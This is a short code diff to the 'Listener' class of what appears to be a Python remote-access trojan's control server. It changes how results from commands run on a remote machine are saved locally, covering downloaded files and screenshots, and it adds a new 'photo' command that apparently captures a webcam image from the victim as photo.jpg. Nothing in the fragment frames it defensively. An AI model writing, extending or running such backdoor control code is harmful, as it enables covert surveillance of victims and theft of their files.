@@ -59,13 +59,20 @@ class Listener:
                     command.append(self.read_file(command[1]))
 
                 result = self.execute_remotely(command)
-                if '[-] Error ' not in result:
+                if '[-] Error:' in result:
+                    pass
+                else:
+                    path = ""
                     if command[0] == 'download':
-                        result = self.write_file(command[1], result.encode())
+                        path = command[1]
                     elif command[0] == 'screenshot':
-                        result = self.write_file('screen.png', result.encode())
+                        path = 'screen.png'
+                    elif command[0] == 'photo':
+                        path = 'photo.jpg'
+                    
+                    result = self.write_file(path, result.encode())
             except Exception as e:
-                result = f'[-] Error occuered during executing command. {e}'
+                result = f'[-] Error: {e}'
             print(result)
 
 # Example
